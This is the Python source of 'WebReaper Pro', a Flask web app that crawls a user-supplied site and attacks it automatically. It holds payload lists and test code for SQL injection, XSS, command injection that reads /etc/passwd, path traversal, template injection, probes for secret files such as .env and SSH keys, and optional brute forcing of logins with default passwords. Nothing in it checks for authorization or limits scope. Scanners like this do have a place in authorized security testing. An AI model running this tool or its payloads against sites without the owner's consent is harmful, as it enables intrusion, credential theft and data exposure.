#!/usr/bin/env python3
"""
WebReaper Pro — Flask Web Interface
pip install flask requests beautifulsoup4
python app.py  →  http://localhost:5000
"""

from flask import Flask, render_template_string, request, Response, jsonify
import threading, queue, json, time, re, sys, uuid
from urllib.parse import urlparse, urljoin, urlencode, urldefrag, parse_qsl, urlunparse
from collections import deque
from datetime import datetime

try:
    import requests as req
    req.packages.urllib3.disable_warnings()
    from bs4 import BeautifulSoup
except ImportError:
    print("pip install flask requests beautifulsoup4")
    sys.exit(1)

app = Flask(__name__)

# scan_id → {"queue": Queue, "done": bool}
SCANS = {}

# ══════════════════════════════════════════════════
# PAYLOADS
# ══════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = [
    "'", "''", "`",
    "' OR '1'='1'--", "' OR 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 99--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "' AND 1=1--", "' AND 1=2--",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(4)--", 4),
    ("'; WAITFOR DELAY '0:0:4'--", 4),
    ("' AND (SELECT * FROM (SELECT(SLEEP(4)))x)--", 4),
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*?mysql_", r"unclosed quotation mark",
    r"ora-\d{4,5}", r"microsoft ole db provider for sql server",
    r"odbc sql server driver", r"postgresql.*?error",
    r"sqlite3?\.", r"syntax error.*?near",
    r"supplied argument is not a valid mysql",
    r"mysql_fetch_array\(\)", r"column count doesn't match",
    r"unknown column", r"table.*?doesn't exist",
    r"division by zero", r"invalid use of null",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '\'"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
]

CMDI_PAYLOADS = [
    ("; id",          ["uid=","root","www-data"]),
    ("| id",          ["uid=","root","www-data"]),
    ("$(id)",         ["uid=","root"]),
    ("; cat /etc/passwd", ["root:x:0:0","daemon:","nobody:"]),
]

LFI_PAYLOADS = [
    ("../etc/passwd",         ["root:x:0:0","daemon:","/bin/"]),
    ("../../etc/passwd",      ["root:x:0:0","daemon:","/bin/"]),
    ("../../../etc/passwd",   ["root:x:0:0","daemon:","/bin/"]),
    ("../../../../etc/passwd",["root:x:0:0","daemon:","/bin/"]),
    ("../../windows/win.ini", ["[fonts]","[extensions]"]),
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"),
    ("#{7*7}", "49"),  ("*{7*7}", "49"),
]

SENSITIVE_FILES = [
    "/.env","/.env.local","/.env.production","/.git/config","/.git/HEAD",
    "/config.php","/wp-config.php","/database.sql","/dump.sql","/backup.sql",
    "/admin/","/phpmyadmin/","/phpMyAdmin/","/.htaccess","/.htpasswd",
    "/.ssh/id_rsa","/server-status","/robots.txt","/sitemap.xml",
    "/swagger.json","/openapi.json","/api-docs","/actuator/env",
    "/phpinfo.php","/info.php","/debug.php","/test.php","/backup/",
    "/package.json","/composer.json","/requirements.txt","/Dockerfile",
    "/docker-compose.yml","/.dockerenv","/wp-login.php","/wp-admin/",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS missing",
    "Content-Security-Policy":   "CSP missing",
    "X-Frame-Options":           "Clickjacking protection missing",
    "X-Content-Type-Options":    "MIME sniffing protection missing",
    "X-XSS-Protection":          "XSS filter not set",
    "Referrer-Policy":           "Referrer policy not set",
}

# ══════════════════════════════════════════════════
# SCANNER ENGINE
# ══════════════════════════════════════════════════

def make_session():
    s = req.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    })
    return s

def get_params(url):
    return dict(parse_qsl(urlparse(url).query))

def inject_url(url, param, value):
    p = urlparse(url)
    params = dict(parse_qsl(p.query))
    params[param] = value
    return urlunparse(p._replace(query=urlencode(params)))

def scan(target, deep, brute, emit):
    S       = make_session()
    TIMEOUT = 10
    origin  = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    reported = set()

    def log(level, msg, detail=""):
        key = f"{level}:{msg[:80]}"
        if key in reported:
            return
        reported.add(key)
        emit({"level": level, "msg": msg, "detail": detail,
              "ts": datetime.now().strftime("%H:%M:%S")})

    def get(url, **kw):
        try:
            return S.get(url, timeout=TIMEOUT, **kw)
        except Exception:
            return None

    def post(url, data, **kw):
        try:
            return S.post(url, data=data, timeout=TIMEOUT, **kw)
        except Exception:
            return None

    # ── headers ────────────────────────────────────
    emit({"type":"phase","msg":"Checking headers & fingerprint..."})
    r = get(target)
    if r:
        hdrs = {k.lower(): v for k, v in r.headers.items()}
        for h, reason in SECURITY_HEADERS.items():
            if h.lower() not in hdrs:
                log("LOW", f"Missing Header: {h}", reason)
        if "server" in hdrs:
            log("INFO", f"Server: {hdrs['server']}")
        if "x-powered-by" in hdrs:
            log("MEDIUM", f"X-Powered-By: {hdrs['x-powered-by']}", "stack disclosure")
        for name, val in r.headers.items():
            if name.lower() == "set-cookie":
                flags = val.lower()
                if "httponly" not in flags:
                    log("MEDIUM", "Cookie missing HttpOnly", val[:60])
                if "secure" not in flags:
                    log("LOW", "Cookie missing Secure", val[:60])

    # ── CORS ───────────────────────────────────────
    r2 = get(target, headers={"Origin": "https://evil-attacker.pwned.com"})
    if r2:
        acao = r2.headers.get("Access-Control-Allow-Origin","")
        acac = r2.headers.get("Access-Control-Allow-Credentials","")
        if acao == "*":
            log("MEDIUM","CORS Wildcard","any origin can read responses")
        elif "evil-attacker" in acao:
            log("CRITICAL" if acac.lower()=="true" else "HIGH",
                "CORS Misconfiguration", f"reflects evil origin | credentials={acac}")

    # ── sensitive files ────────────────────────────
    emit({"type":"phase","msg":"Probing sensitive files..."})
    for path in SENSITIVE_FILES:
        try:
            r = S.get(origin + path, timeout=6, allow_redirects=False, verify=False)
            if r.status_code == 200 and len(r.text) > 10:
                sev = ("CRITICAL" if any(x in path for x in
                       (".env","id_rsa","wp-config","database.sql",".git/config","dump.sql")) else
                       "HIGH" if any(x in path for x in
                       ("admin","phpinfo","swagger","actuator","debug")) else "MEDIUM")
                log(sev, f"Sensitive File: {path}", f"{r.status_code} | {len(r.text)} bytes")
        except Exception:
            pass

    # ── crawler ────────────────────────────────────
    emit({"type":"phase","msg":"Crawling site..."})
    visited   = set()
    all_urls  = []
    all_forms = []
    frontier  = [target]
    MAX_URLS  = 300 if deep else 80
    DEPTH     = 4   if deep else 2

    for depth in range(DEPTH + 1):
        if not frontier or len(all_urls) >= MAX_URLS:
            break
        next_frontier = []
        for url in frontier:
            if len(all_urls) >= MAX_URLS:
                break
            norm = urldefrag(url)[0]
            if norm in visited:
                continue
            visited.add(norm)
            r = get(url)
            if not r or r.status_code in (404,403,410):
                continue
            if "text/html" not in r.headers.get("content-type",""):
                continue
            all_urls.append(url)
            emit({"type":"crawl","msg":f"Crawled [{len(all_urls)}/{MAX_URLS}]: {url[:80]}"})

            soup = BeautifulSoup(r.text, "html.parser")

            for form_tag in soup.find_all("form"):
                action = form_tag.get("action","") or url
                action = urljoin(url, action)
                method = form_tag.get("method","GET").upper()
                inputs = []
                for inp in form_tag.find_all(["input","textarea","select"]):
                    name  = inp.get("name","")
                    itype = inp.get("type","text").lower()
                    val   = inp.get("value","") or (
                        "test@test.com" if itype=="email" else
                        "test123"       if itype=="password" else "test")
                    if name:
                        inputs.append({"name":name,"type":itype,"value":val})
                if inputs:
                    key = (action, method, tuple(i["name"] for i in inputs))
                    if key not in {(f["action"],f["method"],tuple(i["name"] for i in f["inputs"])) for f in all_forms}:
                        all_forms.append({"action":action,"method":method,"inputs":inputs})

            for a in soup.find_all("a", href=True):
                href = a["href"].strip()
                if href.startswith(("javascript:","mailto:","tel:","#")):
                    continue
                full = urldefrag(urljoin(url, href))[0]
                if urlparse(full).netloc == urlparse(origin).netloc:
                    next_frontier.append(full)

        seen = set()
        frontier = [u for u in next_frontier
                    if urldefrag(u)[0] not in visited and
                    urldefrag(u)[0] not in seen and not seen.add(urldefrag(u)[0])]

    emit({"type":"phase","msg":f"Crawled {len(all_urls)} URLs | {len(all_forms)} forms found"})

    param_urls = [u for u in all_urls if "?" in u]
    emit({"type":"phase","msg":f"Testing {len(param_urls)} parametric URLs..."})

    # ── SQLi ───────────────────────────────────────
    for url in param_urls:
        params = get_params(url)
        path   = urlparse(url).path
        for param, orig in params.items():
            for payload in SQLI_ERROR_PAYLOADS:
                r = get(inject_url(url, param, orig + payload))
                if r:
                    for err in SQLI_ERRORS:
                        if re.search(err, r.text, re.I):
                            log("CRITICAL", f"SQLi Error → {path}?{param}",
                                f"payload: {payload}")
                            break
            # boolean blind
            r0 = get(url)
            rt = get(inject_url(url, param, orig + "' AND '1'='1"))
            rf = get(inject_url(url, param, orig + "' AND '1'='2"))
            if r0 and rt and rf:
                if abs(len(rt.text)-len(r0.text))<30 and abs(len(rt.text)-len(rf.text))>50:
                    log("CRITICAL", f"SQLi Boolean Blind → {path}?{param}",
                        f"true_len={len(rt.text)} false_len={len(rf.text)}")
            # time-based
            for payload, thresh in SQLI_TIME_PAYLOADS:
                t0 = time.time()
                get(inject_url(url, param, orig + payload))
                if time.time()-t0 >= thresh-0.5:
                    log("CRITICAL", f"SQLi Time-based → {path}?{param}", f"delay ≥ {thresh}s")

    # ── XSS ────────────────────────────────────────
    for url in param_urls:
        params = get_params(url)
        path   = urlparse(url).path
        for param in params:
            for payload in XSS_PAYLOADS:
                r = get(inject_url(url, param, payload))
                if r and payload.lower() in r.text.lower():
                    log("HIGH", f"XSS Reflected → {path}?{param}", f"payload: {payload[:50]}")
                    break

    # ── LFI ────────────────────────────────────────
    FILE_PARAMS = {"file","page","path","include","load","view","doc",
                   "cat","module","lang","locale","read","open","name","filename","pg","p"}
    for url in param_urls:
        params = get_params(url)
        path   = urlparse(url).path
        targets = [p for p in params if p.lower() in FILE_PARAMS] or list(params.keys())
        for param in targets:
            for payload, inds in LFI_PAYLOADS:
                r = get(inject_url(url, param, payload))
                if r:
                    for ind in inds:
                        if ind in r.text:
                            log("CRITICAL", f"LFI → {path}?{param}", f"payload: {payload}")
                            break

    # ── CMDi ───────────────────────────────────────
    for url in param_urls:
        params = get_params(url)
        path   = urlparse(url).path
        for param, orig in params.items():
            for payload, inds in CMDI_PAYLOADS:
                r = get(inject_url(url, param, orig + payload))
                if r:
                    for ind in inds:
                        if ind in r.text:
                            log("CRITICAL", f"CMDi → {path}?{param}", f"payload: {payload}")
                            break

    # ── SSTI ───────────────────────────────────────
    for url in param_urls:
        params = get_params(url)
        path   = urlparse(url).path
        for param in params:
            for payload, expected in SSTI_PAYLOADS:
                r = get(inject_url(url, param, payload))
                if r and expected in r.text and payload not in r.text:
                    log("CRITICAL", f"SSTI → {path}?{param}", f"payload {payload} → got '{expected}'")

    # ── Forms SQLi+XSS ─────────────────────────────
    emit({"type":"phase","msg":f"Testing {len(all_forms)} forms..."})
    for form in all_forms:
        editable = [i for i in form["inputs"]
                    if i["type"] not in ("hidden","submit","button","image","reset")]
        if not editable:
            continue

        # SQLi
        for payload in SQLI_ERROR_PAYLOADS[:8]:
            data = {i["name"]:i["value"] for i in form["inputs"]}
            for inp in editable:
                data[inp["name"]] = inp["value"] + payload
            r = (post(form["action"],data) if form["method"]=="POST"
                 else get(form["action"], params=data))
            if r:
                for err in SQLI_ERRORS:
                    if re.search(err, r.text, re.I):
                        log("CRITICAL", f"SQLi Form → {form['action']}", f"payload: {payload}")
                        break

        # XSS
        for payload in XSS_PAYLOADS[:4]:
            data = {i["name"]:i["value"] for i in form["inputs"]}
            for inp in editable:
                data[inp["name"]] = payload
            r = (post(form["action"],data) if form["method"]=="POST"
                 else get(form["action"], params=data))
            if r and payload.lower() in r.text.lower():
                log("HIGH", f"XSS Form → {form['action']}", f"payload: {payload[:50]}")
                break

    # ── brute force ────────────────────────────────
    if brute:
        emit({"type":"phase","msg":"Brute forcing login forms..."})
        USERS = ["admin","administrator","root","user","test","guest"]
        PASSWORDS = ["admin","password","123456","admin123","root","test",
                     "qwerty","letmein","welcome","pass","changeme","secret"]
        login_forms = [f for f in all_forms if any(i["type"]=="password" for i in f["inputs"])]
        for form in login_forms:
            u_inp = next((i for i in form["inputs"] if i["type"] in ("text","email")), None)
            p_inp = next((i for i in form["inputs"] if i["type"]=="password"), None)
            if not u_inp or not p_inp:
                continue
            FAIL = {"invalid","incorrect","wrong","failed","error","denied"}
            for user in USERS:
                for pwd in PASSWORDS:
                    data = {i["name"]:i["value"] for i in form["inputs"]}
                    data[u_inp["name"]] = user
                    data[p_inp["name"]] = pwd
                    r = (post(form["action"],data) if form["method"]=="POST"
                         else get(form["action"],params=data))
                    if r and not any(w in r.text.lower() for w in FAIL):
                        log("CRITICAL", f"Login found → {form['action']}",
                            f"user={user} pass={pwd}")
                        break

    emit({"type":"done","msg":"Scan complete"})

# ══════════════════════════════════════════════════
# FLASK ROUTES
# ══════════════════════════════════════════════════

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebReaper Pro</title>
<style>
  :root {
    --bg:   #0d0d0d;
    --bg2:  #141414;
    --bg3:  #1a1a1a;
    --brd:  #2a2a2a;
    --acc:  #ff3333;
    --acc2: #ff6600;
    --txt:  #e8e8e8;
    --dim:  #888;
    --crit: #ff3333;
    --high: #ff6b35;
    --med:  #ffc107;
    --low:  #4dabf7;
    --info: #69db7c;
    --scan: #cc99ff;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: var(--bg);
    color: var(--txt);
    font-family: 'Courier New', monospace;
    min-height: 100vh;
  }
  header {
    background: var(--bg2);
    border-bottom: 1px solid var(--brd);
    padding: 18px 32px;
    display: flex;
    align-items: center;
    gap: 16px;
  }
  .logo {
    font-size: 22px;
    font-weight: bold;
    color: var(--acc);
    letter-spacing: 2px;
    text-shadow: 0 0 20px rgba(255,51,51,0.4);
  }
  .logo span { color: var(--txt); }
  .subtitle { color: var(--dim); font-size: 12px; }
  .container { max-width: 1100px; margin: 0 auto; padding: 32px 20px; }

  .scan-box {
    background: var(--bg2);
    border: 1px solid var(--brd);
    border-radius: 8px;
    padding: 28px;
    margin-bottom: 24px;
  }
  .scan-box h2 { color: var(--acc); margin-bottom: 20px; font-size: 14px; letter-spacing: 1px; }
  .input-row {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    align-items: center;
  }
  input[type=url] {
    flex: 1;
    min-width: 280px;
    background: var(--bg3);
    border: 1px solid var(--brd);
    border-radius: 6px;
    color: var(--txt);
    padding: 12px 16px;
    font-family: monospace;
    font-size: 14px;
    outline: none;
    transition: border-color .2s;
  }
  input[type=url]:focus { border-color: var(--acc); }
  .checkboxes {
    display: flex;
    gap: 20px;
    margin-top: 14px;
    flex-wrap: wrap;
  }
  .checkboxes label {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    color: var(--dim);
    cursor: pointer;
    user-select: none;
  }
  .checkboxes label:hover { color: var(--txt); }
  input[type=checkbox] { accent-color: var(--acc); width: 15px; height: 15px; }
  button {
    background: var(--acc);
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 12px 28px;
    font-family: monospace;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    letter-spacing: 1px;
    transition: background .2s, transform .1s;
  }
  button:hover:not(:disabled) { background: #cc0000; transform: translateY(-1px); }
  button:disabled { background: #444; cursor: not-allowed; }
  #stop-btn {
    background: #333;
    border: 1px solid var(--brd);
    display: none;
  }
  #stop-btn:hover { background: #444; }

  .stats-row {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 10px;
    margin-bottom: 20px;
  }
  .stat-card {
    background: var(--bg2);
    border: 1px solid var(--brd);
    border-radius: 8px;
    padding: 16px;
    text-align: center;
  }
  .stat-card .count { font-size: 28px; font-weight: bold; }
  .stat-card .label { font-size: 11px; color: var(--dim); margin-top: 4px; letter-spacing: 1px; }
  .stat-card.crit .count { color: var(--crit); }
  .stat-card.high .count { color: var(--high); }
  .stat-card.med  .count { color: var(--med);  }
  .stat-card.low  .count { color: var(--low);  }
  .stat-card.info .count { color: var(--info); }

  .results-box {
    background: var(--bg2);
    border: 1px solid var(--brd);
    border-radius: 8px;
    overflow: hidden;
  }
  .results-header {
    padding: 14px 20px;
    border-bottom: 1px solid var(--brd);
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 13px;
    color: var(--dim);
  }
  #log {
    height: 480px;
    overflow-y: auto;
    padding: 16px;
    font-size: 13px;
    line-height: 1.7;
    scroll-behavior: smooth;
  }
  #log::-webkit-scrollbar { width: 6px; }
  #log::-webkit-scrollbar-track { background: var(--bg3); }
  #log::-webkit-scrollbar-thumb { background: var(--brd); border-radius: 3px; }

  .entry { display: flex; gap: 10px; padding: 3px 0; align-items: flex-start; }
  .entry:hover { background: rgba(255,255,255,0.02); border-radius: 4px; }
  .entry .ts  { color: #555; min-width: 60px; font-size: 11px; padding-top: 2px; }
  .entry .badge {
    font-size: 10px; font-weight: bold; padding: 2px 7px;
    border-radius: 3px; min-width: 68px; text-align: center;
    letter-spacing: 0.5px; margin-top: 1px;
  }
  .badge.CRITICAL { background: rgba(255,51,51,0.2);   color: var(--crit); border: 1px solid rgba(255,51,51,0.3); }
  .badge.HIGH     { background: rgba(255,107,53,0.2);  color: var(--high); border: 1px solid rgba(255,107,53,0.3); }
  .badge.MEDIUM   { background: rgba(255,193,7,0.15);  color: var(--med);  border: 1px solid rgba(255,193,7,0.3); }
  .badge.LOW      { background: rgba(77,171,247,0.15); color: var(--low);  border: 1px solid rgba(77,171,247,0.3); }
  .badge.INFO     { background: rgba(105,219,124,0.1); color: var(--info); border: 1px solid rgba(105,219,124,0.2); }
  .badge.SCAN     { background: rgba(204,153,255,0.1); color: var(--scan); border: 1px solid rgba(204,153,255,0.2); }

  .entry .content .msg  { color: var(--txt); }
  .entry .content .detail { color: var(--dim); font-size: 12px; margin-top: 2px; padding-left: 4px; border-left: 2px solid var(--brd); }
  .phase-entry { color: var(--scan); padding: 8px 0 4px; font-size: 12px; opacity: .7; }
  .crawl-entry { color: #444; font-size: 11px; padding: 1px 0; }
  .done-entry  { color: var(--info); padding: 8px 0; font-weight: bold; border-top: 1px solid var(--brd); margin-top: 8px; }

  #progress-bar {
    height: 3px;
    background: var(--acc);
    width: 0%;
    transition: width .3s;
    border-radius: 2px;
  }
  .filter-row {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
  }
  .filter-btn {
    background: var(--bg3);
    border: 1px solid var(--brd);
    color: var(--dim);
    padding: 4px 12px;
    border-radius: 4px;
    font-size: 11px;
    cursor: pointer;
    transition: all .15s;
  }
  .filter-btn:hover, .filter-btn.active { border-color: var(--acc); color: var(--txt); background: rgba(255,51,51,0.1); }
  .empty-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 200px;
    color: var(--dim);
    gap: 10px;
  }
  .empty-state .icon { font-size: 40px; opacity: .3; }
</style>
</head>
<body>
<header>
  <div>
    <div class="logo">WEB<span>REAPER</span> <span style="color:var(--dim);font-size:14px">PRO v4.0</span></div>
    <div class="subtitle">SQLi · XSS · CMDi · LFI · SSTI · Redirect · CORS · Headers · Brute</div>
  </div>
</header>

<div class="container">
  <div class="scan-box">
    <h2>// TARGET</h2>
    <div class="input-row">
      <input type="url" id="target" placeholder="https://target.com" value="http://testphp.vulnweb.com">
      <button id="scan-btn" onclick="startScan()">▶ SCAN</button>
      <button id="stop-btn" onclick="stopScan()">■ STOP</button>
    </div>
    <div class="checkboxes">
      <label><input type="checkbox" id="deep"> Deep crawl (slower, more thorough)</label>
      <label><input type="checkbox" id="brute"> Brute force login forms</label>
    </div>
    <div id="progress-bar" style="margin-top:14px;"></div>
  </div>

  <div class="stats-row">
    <div class="stat-card crit"><div class="count" id="c-crit">0</div><div class="label">CRITICAL</div></div>
    <div class="stat-card high"><div class="count" id="c-high">0</div><div class="label">HIGH</div></div>
    <div class="stat-card med" ><div class="count" id="c-med">0</div><div class="label">MEDIUM</div></div>
    <div class="stat-card low" ><div class="count" id="c-low">0</div><div class="label">LOW</div></div>
    <div class="stat-card info"><div class="count" id="c-info">0</div><div class="label">INFO</div></div>
  </div>

  <div class="results-box">
    <div class="results-header">
      <div class="filter-row">
        <button class="filter-btn active" onclick="setFilter('ALL')">ALL</button>
        <button class="filter-btn" onclick="setFilter('CRITICAL')">CRITICAL</button>
        <button class="filter-btn" onclick="setFilter('HIGH')">HIGH</button>
        <button class="filter-btn" onclick="setFilter('MEDIUM')">MEDIUM</button>
        <button class="filter-btn" onclick="setFilter('LOW')">LOW</button>
        <button class="filter-btn" onclick="setFilter('INFO')">INFO</button>
      </div>
      <span id="entry-count" style="color:#555;font-size:11px">0 entries</span>
    </div>
    <div id="log">
      <div class="empty-state">
        <div class="icon">🕷</div>
        <div>Enter a URL and click SCAN</div>
      </div>
    </div>
  </div>
</div>

<script>
let pollTimer = null;
let scanId    = null;
let offset    = 0;
let allEntries = [];
let currentFilter = 'ALL';
const counts = {CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFO:0};

function setFilter(f) {
  currentFilter = f;
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  renderEntries();
}

function renderEntries() {
  const log = document.getElementById('log');
  if (allEntries.length === 0) {
    log.innerHTML = '<div class="empty-state"><div class="icon">🕷</div><div>Enter a URL and click SCAN</div></div>';
    return;
  }
  const html = allEntries.map(e => {
    if (e.type === 'phase') return `<div class="phase-entry">── ${esc(e.msg)}</div>`;
    if (e.type === 'crawl') return `<div class="crawl-entry">${esc(e.msg)}</div>`;
    if (e.type === 'done')  return `<div class="done-entry">✓ ${esc(e.msg)}</div>`;
    if (currentFilter !== 'ALL' && e.level !== currentFilter) return '';
    return `<div class="entry">
      <span class="ts">${e.ts||''}</span>
      <span class="badge ${e.level}">${e.level}</span>
      <span class="content">
        <div class="msg">${esc(e.msg)}</div>
        ${e.detail ? `<div class="detail">${esc(e.detail)}</div>` : ''}
      </span>
    </div>`;
  }).join('');
  log.innerHTML = html;
  log.scrollTop = log.scrollHeight;
  document.getElementById('entry-count').textContent =
    allEntries.filter(e => e.level).length + ' findings';
}

function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function startScan() {
  const target = document.getElementById('target').value.trim();
  if (!target) return;
  stopScan();

  allEntries = [];
  Object.keys(counts).forEach(k => { counts[k]=0; document.getElementById('c-'+k.toLowerCase()).textContent='0'; });
  renderEntries();

  document.getElementById('scan-btn').disabled = true;
  document.getElementById('stop-btn').style.display = 'inline-block';
  document.getElementById('progress-bar').style.width = '5%';

  const deep  = document.getElementById('deep').checked;
  const brute = document.getElementById('brute').checked;

  try {
    const res = await fetch('/start', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({target, deep, brute})
    });
    const data = await res.json();
    scanId = data.scan_id;
    offset = 0;
    pollTimer = setInterval(poll, 800);
  } catch(e) {
    allEntries.push({type:'done', msg:'Failed to start: '+e});
    renderEntries();
    document.getElementById('scan-btn').disabled = false;
    document.getElementById('stop-btn').style.display = 'none';
  }
}

async function poll() {
  if (!scanId) return;
  try {
    const res  = await fetch(`/poll/${scanId}?offset=${offset}`);
    const data = await res.json();

    for (const item of data.items) {
      allEntries.push(item);
      if (item.level && counts[item.level] !== undefined) {
        counts[item.level]++;
        document.getElementById('c-'+item.level.toLowerCase()).textContent = counts[item.level];
      }
    }
    offset += data.items.length;

    const prog = Math.min(5 + allEntries.length * 0.5, 95);
    document.getElementById('progress-bar').style.width = prog + '%';

    renderEntries();

    if (data.done) {
      clearInterval(pollTimer);
      pollTimer = null;
      scanId    = null;
      document.getElementById('progress-bar').style.width = '100%';
      document.getElementById('scan-btn').disabled = false;
      document.getElementById('stop-btn').style.display = 'none';
    }
  } catch(e) { /* network hiccup, retry next tick */ }
}

function stopScan() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  scanId = null;
  document.getElementById('scan-btn').disabled = false;
  document.getElementById('stop-btn').style.display = 'none';
  if (allEntries.length > 0) {
    allEntries.push({type:'done', msg:'Scan stopped by user'});
    renderEntries();
  }
}

document.getElementById('target').addEventListener('keydown', e => {
  if (e.key === 'Enter') startScan();
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/start", methods=["POST"])
def start_scan():
    data   = request.get_json(force=True)
    target = data.get("target","").strip()
    deep   = bool(data.get("deep", False))
    brute  = bool(data.get("brute", False))

    if not target.startswith(("http://","https://")):
        target = "http://" + target

    sid = str(uuid.uuid4())
    q   = queue.Queue()
    SCANS[sid] = {"queue": q, "done": False, "buf": []}

    def run():
        try:
            scan(target, deep, brute, lambda x: q.put(x))
        except Exception as e:
            q.put({"type":"done","msg":f"Error: {str(e)}"})

    threading.Thread(target=run, daemon=True).start()

    # drain queue into buf in background
    def drainer():
        while True:
            try:
                item = q.get(timeout=90)
                SCANS[sid]["buf"].append(item)
                if item.get("type") == "done":
                    SCANS[sid]["done"] = True
                    break
            except queue.Empty:
                SCANS[sid]["buf"].append({"type":"done","msg":"Timeout"})
                SCANS[sid]["done"] = True
                break

    threading.Thread(target=drainer, daemon=True).start()
    return jsonify({"scan_id": sid})

@app.route("/poll/<sid>")
def poll(sid):
    if sid not in SCANS:
        return jsonify({"items":[],"done":True})
    entry  = SCANS[sid]
    offset = int(request.args.get("offset", 0))
    items  = entry["buf"][offset:]
    done   = entry["done"]
    # cleanup after done + all items fetched
    if done and offset + len(items) >= len(entry["buf"]):
        SCANS.pop(sid, None)
    return jsonify({"items": items, "done": done})

if __name__ == "__main__":
    print("""
 ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
 ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝

  Web Interface → http://localhost:5000
""")
    app.run(debug=False, host="0.0.0.0", port=5000, threaded=True)
